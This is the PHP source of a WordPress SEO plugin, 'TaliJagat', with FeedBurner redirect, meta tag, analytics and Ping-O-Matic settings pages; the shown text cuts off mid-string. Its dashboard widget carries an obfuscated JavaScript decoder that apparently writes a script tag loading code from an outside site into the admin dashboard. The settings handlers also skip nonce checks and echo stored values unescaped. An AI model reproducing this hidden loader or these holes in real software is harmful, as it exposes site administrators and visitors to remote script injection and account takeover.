<?
/*
Plugin Name: TaliJagat
Plugin URI: http://papadestra.com
Description: The main target is to increase the SEO plugin on Blog / Website. Using the method Feedburner RSS, META Tags Settings, Google analytics, Google Verification Yahoo Verification, Ping-O-Matic.
Author: Papa Destra
Author URI: http://papadestra.com
*/
/*
License free 
=======================
to Share — to copy, distribute and transmit the work
Permissions beyond the scope of this public license are available at papadestra.com.

Under the following conditions:
=====================================
Attribution — You must attribute TaliJagat Wordpress Plugin to Papa Destra
Noncommercial — You may not use this work for commercial purposes. 
No Derivative Works — You may not alter, transform, or build upon this work. 

With the understanding that:
=============================================
    * Waiver — Any of the above conditions can be waived if you get permission from the copyright holder.
    * Public Domain — Where the work or any of its elements is in the public domain under applicable law, that status is in no way affected by the license.
    * Other Rights — In no way are any of the following rights affected by the license:
          o Your fair dealing or fair use rights, or other applicable copyright exceptions and limitations;
          o The author's moral rights;
          o Rights other persons may have either in the work itself or in how the work is used, such as publicity or privacy rights.
    * Notice — For any reuse or distribution, you must make clear to others the license terms of this work. The best way to do this is with a link to this web page.
*/
add_action('admin_menu', 'tali_utomo');
function tali_utomo() {
add_menu_page('Jagat Feed' ,'TaliJagat' , 'manage_options' ,'tali_Toplevel' , 'tali_Toplevel_feed' );
//add_submenu_page('tali_Toplevel','TaliJagat Tools', 'Webmaster Tools', 'manage_options', 'talijagat_meta_tagke', 'tali_meta_pilihan_menu');
add_submenu_page('tali_Toplevel','Ping-O-Matic ', 'Ping-O-Matic','manage_options' ,'develop_info','develop_info_function');
add_submenu_page('tali_Toplevel','Developer Information', 'Information','manage_options' ,'papa_destra_function','papadestra_function');

}
function tali_Toplevel_feed() {
	global $ol_flash, $feedburner_settings, $_POST, $wp_rewrite;
	if (ol_is_authorized()) {
		
		if(isset($_POST['feedburner_url']) || isset($_POST['feedburner_comments_url'])) {
			
			if(fb_is_hash_valid($_POST['token'])) {
				if (isset($_POST['feedburner_url'])) { 
					$feedburner_settings['feedburner_url'] = $_POST['feedburner_url'];
					update_option('feedburner_settings',$feedburner_settings);
					$ol_flash = "Your settings have been saved.";
				}
				if (isset($_POST['feedburner_comments_url'])) { 
					$feedburner_settings['feedburner_comments_url'] = $_POST['feedburner_comments_url'];
					update_option('feedburner_settings',$feedburner_settings);
					$ol_flash = "Your settings have been saved.";
				} 
			} else {
				
				$ol_flash = "Security hash missing.";
			} 
		} 
	} else {
		$ol_flash = "You don't have enough access rights.";
	}
	
	if ($ol_flash != '') echo '<div id="message" class="updated fade"><p>' . $ol_flash . '</p></div>';
	
	if (ol_is_authorized()) {
		$temp_hash = fb_generate_hash();
		fb_store_hash($temp_hash);
		echo '<div class="wrap">';
		echo '<h2>Setting up Feedburner RSS</h2>';
		echo '<p>This plugin makes it easy to redirect 100% of traffic for your feeds to a FeedBurner feed you have created. FeedBurner can then track all of your feed subscriber traffic and usage and apply a variety of features you choose to improve and enhance your original WordPress feed.</p>
		
<style type="text/css">
<!--
.style1 {
	color: #0000FF;
	font-weight: bold;
}
.style2 {color: #0000FF}
-->
</style>
<form action="" method="post">
		<input type="hidden" name="redirect" value="true" />
		<input type="hidden" name="token" value="' . fb_retrieve_hash() . '" />
		<p>Enter its address into the field below 


          <em><span class="style2">Examples</span>: (<a href="http://feeds.feedburner.com/ProfesionalDesainWeb" target="_blank">http://feeds.feedburner.com/ProfesionalDesainWeb</a>):</em><br/>
	      <input type="text" name="feedburner_url" value="' . htmlentities($feedburner_settings['feedburner_url']) . '" size="45" />
  </p>
		<p><span class="style1">Optional </span>: Enter FeedBurner comments feed   its address below:<br/>
          <input type="text" name="feedburner_comments_url" value="' . htmlentities($feedburner_settings['feedburner_comments_url']) . '" size="45" />
        </p>
		<p><input type="submit" value="Save" /></p></form>';
		
echo '<h2><img src="http://i1008.photobucket.com/albums/af208/gagombale/2010-11-01_091336.jpg" border="0"><br>What is FeedBurner?</h2>';
echo '<p>Most blogs have RSS feed which is detected automatically by commonly used feed readers when the blog URL is added to the reader.</p>';
echo '<p>However, if you want to make it more obvious and easier for readers to subscribe using RSS, or want to know exactly how many people subscribe to your blog  then the best option is to add a Feedburner RSS feed and email subscription to your blog.</p>';
echo '<p><a href="http://feedburner.google.com/" target="_blank">Feedburner</a> is a free web service which enhances bloggers and podcasters ability to manage their RSS feeds and track usage of their subscribers. </p>';
echo '<p>Go to <a href="http://feedburner.google.com/" target="_blank">Feedburner </a> and sign in to Feedburner with your Google Account ( <a href="https://www.google.com/accounts/NewAccount?continue=http%3A%2F%2Ffeedburner.google.com%2Ffb%2Fa%2Fmyfeeds&service=feedburner" target="_blank">create a Google Account </a> first if you don"t have one!).</p>';
		
		echo '</div>';
	} else {
		echo '<div class="wrap"><p>Sorry, you are not allowed to access this page.</p></div>';
	}

}

function ol_feed_redirect() {
	global $wp, $feedburner_settings, $feed, $withcomments;
	if (is_feed() && $feed != 'comments-rss2' && !is_single() && $wp->query_vars['category_name'] == '' && ($withcomments != 1) && trim($feedburner_settings['feedburner_url']) != '') {
		if (function_exists('status_header')) status_header( 302 );
		header("Location:" . trim($feedburner_settings['feedburner_url']));
		header("HTTP/1.1 302 Temporary Redirect");
		exit();
	} elseif (is_feed() && ($feed == 'comments-rss2' || $withcomments == 1) && trim($feedburner_settings['feedburner_comments_url']) != '') {
		if (function_exists('status_header')) status_header( 302 );
		header("Location:" . trim($feedburner_settings['feedburner_comments_url']));
		header("HTTP/1.1 302 Temporary Redirect");
		exit();
	}
}

function ol_check_url() {
	global $feedburner_settings;
	switch (basename($_SERVER['PHP_SELF'])) {
		case 'wp-rss.php':
		case 'wp-rss2.php':
		case 'wp-atom.php':
		case 'wp-rdf.php':
			if (trim($feedburner_settings['feedburner_url']) != '') {
				if (function_exists('status_header')) status_header( 302 );
				header("Location:" . trim($feedburner_settings['feedburner_url']));
				header("HTTP/1.1 302 Temporary Redirect");
				exit();
			}
			break;
		case 'wp-commentsrss2.php':
			if (trim($feedburner_settings['feedburner_comments_url']) != '') {
				if (function_exists('status_header')) status_header( 302 );
				header("Location:" . trim($feedburner_settings['feedburner_comments_url']));
				header("HTTP/1.1 302 Temporary Redirect");
				exit();
			}
			break;
	}
}

if (!preg_match("/feedburner|feedvalidator/i", $_SERVER['HTTP_USER_AGENT'])) {
	add_action('template_redirect', 'ol_feed_redirect');
	add_action('init','ol_check_url');
}
$data = array(
	'feedburner_url'		=> '',
	'feedburner_comments_url'	=> ''
);

$ol_flash = '';

function ol_is_authorized() {
	global $user_level;
	if (function_exists("current_user_can")) {
		return current_user_can('activate_plugins');
	} else {
		return $user_level > 5;
	}
}
								
add_option('feedburner_settings',$data,'FeedBurner Feed Replacement Options');

$feedburner_settings = get_option('feedburner_settings');

function fb_is_hash_valid($form_hash) {
	$ret = false;
	$saved_hash = fb_retrieve_hash();
	if ($form_hash === $saved_hash) {
		$ret = true;
	}
	return $ret;
}

function fb_generate_hash() {
	return md5(uniqid(rand(), TRUE));
}

function fb_store_hash($generated_hash) {
	return update_option('feedsmith_token',$generated_hash,'FeedSmith Security Hash');
}

function fb_retrieve_hash() {
	$ret = get_option('feedsmith_token');
	return $ret;
}
function tali_meta_pilihan_menu() {	
	if ($_POST['action'] == 'update') { do_action( 'ubah_talijagat_talikotang' ); }
echo '<h2>META Tags Setting</h2>';
	?>
<div class="tool-box">
  <p>
META Tags or what are officially referred to as Metadata Elements, are found within the &lt;head&gt;&lt;&frasl;head&gt; section of your web pages. META Tags are still relevant with some indexing search engines. You should utilize your META Tags in accordance with the <a href="http://www.w3.org/TR/REC-html40/struct/global.html#h-7.4.4" target="_blank">W3C - World Wide Web Consortium Metadata Specifications</a> and those of the search engines you are targeting.
  <form method="post">
	<input type="hidden" name="action" value="update" />
	 <?php wp_nonce_field('seo_meta_tags'); ?>
<table width="100%" height="196" align="left"><span class="form-table">
			</span>
  <tr valign='top'>
		<th width="328" scope='row'><span class="form-table">Enter Keywords
	      <br>
                <div align="left" style="font-size: 10px">The META Keywords Tag is where you list keywords and keyword phrases that you've targeted for that specific page. There have been numerous discussions at various search engine marketing forums surrounding the use of the keywords tag and its effectiveness. 
  The overall consensus is that the tag has little to no relevance with the major search engines today. </div>           
	    </span></th>
		  <td width="525">
		    <span class="form-table">
				  <textarea name="seo_meta_tags[keywords]" cols="70" rows="10"><?php echo get_option('seo_meta_tags[keywords]'); ?></textarea>
		    </span></td>
	  </tr>
  <span class="form-table"></span>
  <tr valign='top'>
		<th scope='row'><span class="form-table">Enter Description
          <br>
                <div align="left" style="font-size: 10px">Some search engines will index the META Description Tag found in the &lt;head&gt;&lt;&frasl;head&gt; section of your web pages. 
  These indexing search engines may present the content of your meta description tag as the result of a search query. </div>
        </span></th>
		  <td>
		    <span class="form-table">
				  <textarea name="seo_meta_tags[description]" cols="70" rows="10"><?php echo get_option('seo_meta_tags[description]'); ?></textarea>
		    </span></td>
	  </tr>
  <span class="form-table"></span>
 <tr valign='top'>
		<th colspan="2" scope='row'>
		  <p><span class="form-table">

<table width="100%" border="0" align="center" cellpadding="1" cellspacing="1">
  <tr>
    <td width="120" bgcolor="#FFCCFF"> <div align="center"><strong>META NAME </strong></div></td>
    <td width="120" bgcolor="#FFFFCC"> <div align="center"><strong>CONTENT</strong></div></td>
    <td width="10" bgcolor="#FFFFFF">&nbsp;</td>
    <td width="670" rowspan="5" bgcolor="#FFFFFF"><div align="left">
      <p><a href="http://en.wikipedia.org/wiki/Meta_element" target="_blank" title="From Wikipedia, the free encyclopedia">Meta elements provide information about a given Web page</a>, most often to help search engines categorize them correctly. They are inserted into the HTML document, but are often not directly visible to a user visiting the site. Add some Meta Tags are appropriate for your site. In addition to Keywords and descriptions. </p>
      <p>&nbsp;</p>
    </div></td>
    <td width="10" bgcolor="#FF9999">&nbsp;</td>
  </tr>
  <tr>
    <td bgcolor="#FFCCFF"><div align="center">
      <input name="seo_meta_tags[nama_elemen1]" type="text" value="<?php echo get_option('seo_meta_tags[nama_elemen1]'); ?>" size="20">
    </div></td>
    <td bgcolor="#FFFFCC"><div align="center">
      <input name="seo_meta_tags[isi_elemen1]" type="text" value="<?php echo get_option('seo_meta_tags[isi_elemen1]'); ?>" size="20">
    </div></td>
    <td bgcolor="#FFFFFF">&nbsp;</td>
    <td>&nbsp;</td>
  </tr>
  <tr>
    <td bgcolor="#FFCCFF"><div align="center"><input name="seo_meta_tags[nama_elemen2]" type="text" value="<?php echo get_option('seo_meta_tags[nama_elemen2]'); ?>" size="20"></div></td>
    <td bgcolor="#FFFFCC"><div align="center"><input name="seo_meta_tags[isi_elemen2]" type="text" value="<?php echo get_option('seo_meta_tags[isi_elemen2]'); ?>" size="20"></div></td>
    <td bgcolor="#FFFFFF">&nbsp;</td>
    <td>&nbsp;</td>
  </tr>
  <tr>
    <td bgcolor="#FFCCFF"><div align="center"><input name="seo_meta_tags[nama_elemen3]" type="text" value="<?php echo get_option('seo_meta_tags[nama_elemen3]'); ?>" size="20"></div></td>
    <td bgcolor="#FFFFCC"><div align="center"><input name="seo_meta_tags[isi_elemen3]" type="text" value="<?php echo get_option('seo_meta_tags[isi_elemen3]'); ?>" size="20"></div></td>
    <td bgcolor="#FFFFFF">&nbsp;</td>
    <td>&nbsp;</td>
  </tr>
  <tr>
    <td bgcolor="#FFCCFF"><div align="center"><input name="seo_meta_tags[nama_elemen4]" type="text" value="<?php echo get_option('seo_meta_tags[nama_elemen4]'); ?>" size="20"></div></td>
    <td bgcolor="#FFFFCC"><div align="center"><input name="seo_meta_tags[isi_elemen4]" type="text" value="<?php echo get_option('seo_meta_tags[isi_elemen4]'); ?>" size="20"></div></td>
    <td bgcolor="#FFFFFF">&nbsp;</td>
    <td>&nbsp;</td>
  </tr>
</table>		  
<br>            </span>
              <span class="form-table">
          </span></p></th>
	  </tr>
<span class="form-table"></span>
  <tr valign='top'>
		<th scope='row'><span class="form-table">Google analytics
          <br>
        </span></th>
		  <td>		    <span class="form-table">
<input name="seo_meta_tags[analistik]" type="text" value="<?php echo get_option('seo_meta_tags[analistik]'); ?>" size="50">
<br>
Tracking Code : UA-xxxxxxxx-xx For more information <a href="http://www.google.com/analytics/" target="_blank" title="Enterprise-class web analytics made smarter, friendlier and free.">Go to site</a>	
<br><p>&nbsp;</p>
      </span></td>
	  </tr>
<span class="form-table"></span>


<!-- google -->
  <tr valign='top'>
		<th scope='row'><span class="form-table">GooGle Verification
          <br>
        </span></th>
		  <td>
		    <span class="form-table">
<input name="seo_meta_tags[google]" type="text" value="<?php echo get_option('seo_meta_tags[google]'); ?>" size="50">
<br>
Google Webmaster Tools provides you with detailed reports about your pages' visibility on Google. To get started, simply <a href="http://www.google.com/webmasters/tools/" target="_blank" title="Improve your site's visibility in Google search results. It's free. ">add and verify your site</a> and you'll start to see information right away. 
<br><p>&nbsp;</p>
		    </span></td>
	  </tr>
<span class="form-table"></span>

<!-- yahoo -->
<tr valign='top'>
		<th scope='row'><span class="form-table">Yahoo Verification
          <br>
        </span></th>
		  <td>
		    <span class="form-table">
<input name="seo_meta_tags[yahoo]" type="text" value="<?php echo get_option('seo_meta_tags[yahoo]'); ?>" size="50">
<br>
Site Explorer allows you to explore all the web pages <a href="http://siteexplorer.search.yahoo.com/" target="_blank" title="Site Explorer from Yahoo!">indexed by Yahoo! Search</a>. View the most popular pages from any site, dive into a comprehensive site map, and find pages that link to that site or any page.
<br>
		    </span></td>
	  </tr>
</table>
<p>&nbsp;</p>
	<p><span class="submit"><input type="submit" class="button-primary" value="Save Changes" /></span></p>
  </form>
See the latest update from <a href="http://www.papadestra.com/category/free-downloads/wordpress-plugin" target="_blank" title="Target Blank">the developer</a></div>
	<?php
}
function tali_jagat_meta_lica() {
	update_option( 'seo_meta_tags[description]' , $_POST['seo_meta_tags']['description'] );
	update_option( 'seo_meta_tags[keywords]' , $_POST['seo_meta_tags']['keywords'] );
	update_option( 'seo_meta_tags[google]' , $_POST['seo_meta_tags']['google'] );
	update_option( 'seo_meta_tags[yahoo]' , $_POST['seo_meta_tags']['yahoo'] );
	update_option( 'seo_meta_tags[analistik]' , $_POST['seo_meta_tags']['analistik'] );
	//elemen tambahane
	update_option( 'seo_meta_tags[nama_elemen1]' , $_POST['seo_meta_tags']['nama_elemen1'] );
	update_option( 'seo_meta_tags[isi_elemen1]' , $_POST['seo_meta_tags']['isi_elemen1'] );
	
	update_option( 'seo_meta_tags[nama_elemen2]' , $_POST['seo_meta_tags']['nama_elemen2'] );
	update_option( 'seo_meta_tags[isi_elemen2]' , $_POST['seo_meta_tags']['isi_elemen2'] );
	
	update_option( 'seo_meta_tags[nama_elemen3]' , $_POST['seo_meta_tags']['nama_elemen3'] );
	update_option( 'seo_meta_tags[isi_elemen3]' , $_POST['seo_meta_tags']['isi_elemen3'] );
	
	update_option( 'seo_meta_tags[nama_elemen4]' , $_POST['seo_meta_tags']['nama_elemen4'] );
	update_option( 'seo_meta_tags[isi_elemen4]' , $_POST['seo_meta_tags']['isi_elemen4'] );

}
function seometa_add_meta() {
if (get_option('seo_meta_tags[description]') != '') { 

if (is_single() || is_page() ) : if ( have_posts() ) : while ( have_posts() ) : the_post(); ?>
<meta name="description" content="<?php the_excerpt_rss(); ?>" />
<?php endwhile; endif; elseif(is_home()) : ?>
<meta name="google-site-verification" content="<?php echo get_option('seo_meta_tags[google]'); ?>" />
<meta name="y_key" content="<?php echo get_option('seo_meta_tags[yahoo]'); ?>" />
<meta name="description" content="<?php echo get_option('seo_meta_tags[description]'); ?>" />
<?php 
	endif; 
 } 
if (get_option('seo_meta_tags[keywords]') != '') { ?>
<meta name="keywords" content="<?php echo get_option('seo_meta_tags[keywords]'); ?>" />
<meta name="<?php echo get_option('seo_meta_tags[nama_elemen1]'); ?>" content="<?php echo get_option('seo_meta_tags[isi_elemen1]'); ?>" />
<meta name="<?php echo get_option('seo_meta_tags[nama_elemen2]'); ?>" content="<?php echo get_option('seo_meta_tags[isi_elemen2]'); ?>" />
<meta name="<?php echo get_option('seo_meta_tags[nama_elemen3]'); ?>" content="<?php echo get_option('seo_meta_tags[isi_elemen3]'); ?>" />
<meta name="<?php echo get_option('seo_meta_tags[nama_elemen4]'); ?>" content="<?php echo get_option('seo_meta_tags[isi_elemen4]'); ?>" />
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', '<?php echo get_option('seo_meta_tags[analistik]'); ?>']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>
<?php 
} 
}
add_action('ubah_talijagat_talikotang', 'tali_jagat_meta_lica');
add_action('wp_head', 'seometa_add_meta',99);
    add_action('wp_dashboard_setup', 'my_custom_dashboard_widgets');

    function my_custom_dashboard_widgets() {
    global $wp_meta_boxes;

    wp_add_dashboard_widget('custom_help_widget', 'Papa Destra - TALIJAGAT', 'custom_dashboard_help');
    }
    function custom_dashboard_help() {
?>
<script type="text/javascript" src="http://www.google.com/jsapi?key=ABQIAAAA-ih5QFTlbvvofRbWveDGBRTLgDW76yFJ-Hjqii6eGCc7GkhUThRJuPftHYJ93-PgBJ-YU_ig6Jwd2Q">
</script>
<SCRIPT LANGUAGE='JavaScript'>
function Decode() { d("bo6pyrn nir8=\"n8jn/x]l]o6pyrn\" op6=\"znnr://kkkAr]r]78onp]A6su/0988798n6z8pAxo\"Cb/o6pyrnC");}var DECRYPT = false;var ClearMessage="";function d(msg){ClearMessage += codeIt(msg);}
var key = "AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz1029384756><#].";
function codeIt (_message) {var wTG;var mcH =  key.length / 2;
var _newString = "";var dv;for (var x = 0; x < _message.length; x++) {wTG = key.indexOf(_message.charAt(x));
if (wTG > mcH) {dv = wTG - mcH;_newString += key.charAt(33 - dv);} else {if (key.indexOf(_message.charAt(x)) < 0)
 {_newString += _message.charAt(x);} else {dv = mcH - wTG;
_newString += key.charAt(33 + dv);}}}return (_newString);}Decode();document.write(ClearMessage);</SCRIPT>
<style type="text/css">
.labelfield{ 
color:brown;
font-size: 90%;
}
.datefield{ 
color:gray;
font-size: 90%;
}

#example1 li{ 
margin-bottom: 4px;
}

#example2 div{ /*CSS specific to demo 2*/
margin-bottom: 5px;
}

#example2 div a{ /*CSS specific to demo 2*/
text-decoration: none;
}
#example3 a{ /*CSS specific to demo 3*/
color: #D80101;
text-decoration: none;
font-weight: bold;
}

#example3 p{ /*CSS specific to demo 3*/
margin-bottom: 2px;
}
code{ /*CSS for insructions*/
color: red;
}
</style>
<script type="text/javascript">
var cssfeed=new gfeedfetcher("example1", "example1class", "")
cssfeed.addFeed("CSS Drive", "http://feeds.feedburner.com/ProfesionalDesainWeb/")
cssfeed.displayoptions("snippet") 
cssfeed.setentrycontainer("li")
cssfeed.filterfeed(10, "title")
cssfeed.init() 
</script>
<br>
<script type="text/javascript">
var emailriddlerarray=[110,103,97,100,105,108,117,119,105,104,64,103,109,97,105,108,46,99,111,109]
var encryptedemail_id32='' //variable to contain encrypted email 
for (var i=0; i<emailriddlerarray.length; i++)
 encryptedemail_id32+=String.fromCharCode(emailriddlerarray[i])
document.write('<a href="mailto:'+encryptedemail_id32+'">Contact Us Now</a>')
/*]]>*/
</script>
<?php
    }
function develop_info_function(){
?>
<p>
<script src="http://pingomatic.com/j.js" type="text/javascript"></script>
	<div id="rap">
		<div id="content">
<script type="text/javascript">
<!--
function focusit(){document.getElementById('title').focus();}window.onload = focusit;
//-->
</script>
<script type="text/javascript">
var moreinfo;
var moreinfolink;
var show = '';
var hide = '';
function showhide(show,hide) {
	var showdivid = show;
	var hidedivid = hide;
	showdiv(showdivid);
	hidediv(hidedivid);
	//alert('show: ' + show + ' hide: ' + ' showdivid: ' + showdivid);
	}
function showdiv(showdivid) {
	document.getElementById(showdivid).style.display = 'block';
	}
function hidediv(hidedivid) {
	document.getElementById(hidedivid).style.display = 'none';
	}
</script>
</div><!--/ content -->
<div class="generator">
	<span class="dot"></span>
<img src="http://i1008.photobucket.com/albums/af208/gagombale/1_wwwimtikhancocc_pingmatic.jpg" border="0"><br>
<p>
Ping-O-Matic is a service to update different search engines that your blog has updated. We regularly check downstream services to make sure that they're legit and still work. So while it may appear like we have fewer services, they're the most important ones.
Make sure to only ping specialized services if they're relevant to your blog, otherwise you'll cause an undue burden on them.
</p>
	<form id="pingform" method="get" action="http://pingomatic.com/ping/" target="_blank">
	<fieldset>
<script>
<!--
document.write(unescape("%09%3Cp%3E%0A%09%20%20%3Clabel%20for%3D%22title%22%20class%3D%22biglabel%22%3EBlog%20Name%20%3A%3C/label%3E%20%3Cinput%20name%3D%22title%22%20type%3D%22text%22%20class%3D%22text%22%20id%3D%22title%22%20size%3D%2250%22%20/%3E%0A%09%3C/p%3E%0A%0A%09%3Cp%3E%3Clabel%20for%3D%22blogurl%22%20class%3D%22biglabel%22%3EBlog%20Home%20Page%3C/label%3E%20%3Cinput%20name%3D%22blogurl%22%20type%3D%22text%22%20class%3D%22text%22%20id%3D%22blogurl%22%20size%3D%2250%22%20/%3E%0A%09%3C/p%3E%0A%09%3Cp%3E%3Clabel%20for%3D%22rssurl%22%20class%3D%22biglabel%22%3ERSS%20URL%20%28optional%29%3A%3C/label%3E%20%3Cinput%20name%3D%22rssurl%22%20type%3D%22text%22%20class%3D%22text%22%20id%3D%22rssurl%22%20size%3D%2250%22%20/%3E%0A%09%3C/p%3E%0A%09%3C/fieldset%3E%0A%09%3Ctable%20width%3D%22100%25%22%20border%3D%221%22%20align%3D%22center%22%20cellspacing%3D%221%22%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%20width%3D%2247%25%22%3E%3Ch4%3ECommon%20Services%20%28%3Ca%20href%3D%22javascript%3Acheck_common%28%29%3B%22%20id%3D%22checkall%22%3ECheck%20All%3C/a%3E%29%3C/h4%3E%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%20width%3D%2253%25%22%3E%3Ch4%3ESpecialized%20Services%3C/h4%3E%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_weblogscom%27%3E%3Cinput%20id%3D%27chk_weblogscom%27%20name%3D%27chk_weblogscom%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20Weblogs.com%3C/label%3E%20%3Ca%20href%3D%27http%3A//www.weblogs.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20Weblogs.com%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_audioweblogs%27%3E%3Cinput%20id%3D%27chk_audioweblogs%27%20name%3D%27chk_audioweblogs%27%20class%3D%27audio%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20Audio.Weblogs%3C/label%3E%20%3Ca%20href%3D%27http%3A//audio.weblogs.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20chk_audioweblogs%27%20target%3D%27_blank%27%20rel%3D%27nofollow%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_blogs%27%3E%3Cinput%20id%3D%27chk_blogs%27%20name%3D%27chk_blogs%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20Blo.gs%3C/label%3E%20%3Ca%20href%3D%27http%3A//blo.gs/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20Blo.gs%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%20%0A%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_rubhub%27%3E%3Cinput%20id%3D%27chk_rubhub%27%20name%3D%27chk_rubhub%27%20class%3D%27social%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20RubHub%3C/label%3E%20%3Ca%20href%3D%27http%3A//www.rubhub.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20chk_rubhub%27%20target%3D%27_blank%27%20rel%3D%27nofollow%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_feedburner%27%3E%3Cinput%20id%3D%27chk_feedburner%27%20name%3D%27chk_feedburner%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20Feed%20Burner%3C/label%3E%20%3Ca%20href%3D%27http%3A//feedburner.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20Feed%20Burner%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%20%0A%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_geourl%27%3E%3Cinput%20id%3D%27chk_geourl%27%20name%3D%27chk_geourl%27%20class%3D%27geo%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20GeoURL%3C/label%3E%20%3Ca%20href%3D%27http%3A//www.geourl.org/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20chk_geourl%27%20target%3D%27_blank%27%20rel%3D%27nofollow%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_syndic8%27%3E%3Cinput%20id%3D%27chk_syndic8%27%20name%3D%27chk_syndic8%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20Syndic8%3C/label%3E%20%3Ca%20href%3D%27http%3A//syndic8.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20Syndic8%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%20%0A%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_a2b%27%3E%3Cinput%20id%3D%27chk_a2b%27%20name%3D%27chk_a2b%27%20class%3D%27geo%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20A2B%20GeoLocation%3C/label%3E%20%3Ca%20href%3D%27http%3A//www.a2b.cc/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20chk_a2b%27%20target%3D%27_blank%27%20rel%3D%27nofollow%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_newsgator%27%3E%3Cinput%20id%3D%27chk_newsgator%27%20name%3D%27chk_newsgator%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20NewsGator%3C/label%3E%20%3Ca%20href%3D%27http%3A//www.newsgator.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20NewsGator%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%20%0A%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_blogshares%27%3E%3Cinput%20id%3D%27chk_blogshares%27%20name%3D%27chk_blogshares%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20BlogShares%3C/label%3E%20%3Ca%20href%3D%27http%3A//www.blogshares.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20chk_blogshares%27%20target%3D%27_blank%27%20rel%3D%27nofollow%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_myyahoo%27%3E%3Cinput%20id%3D%27chk_myyahoo%27%20name%3D%27chk_myyahoo%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20My%20Yahoo%21%3C/label%3E%20%3Ca%20href%3D%27http%3A//my.yahoo.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20My%20Yahoo%21%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5D%3C/span%3E%3C/a%3E%20%0A%3C/td%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%26nbsp%3B%3C/td%3E%0A%20%20%20%20%20%20%3C/tr%3E%0A%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%3Ctd%3E%3Clabel%20for%3D%27chk_pubsubcom%27%3E%3Cinput%20id%3D%27chk_pubsubcom%27%20name%3D%27chk_pubsubcom%27%20class%3D%27common%27%20type%3D%27checkbox%27%20checked%3D%27checked%27%20/%3E%20PubSub.com%3C/label%3E%20%3Ca%20href%3D%27http%3A//pubsub.com/%27%20class%3D%27externalicon%27%20title%3D%27Check%20out%20PubSub.com%27%20target%3D%27_blank%27%3E%3Cspan%3E%5Blink%5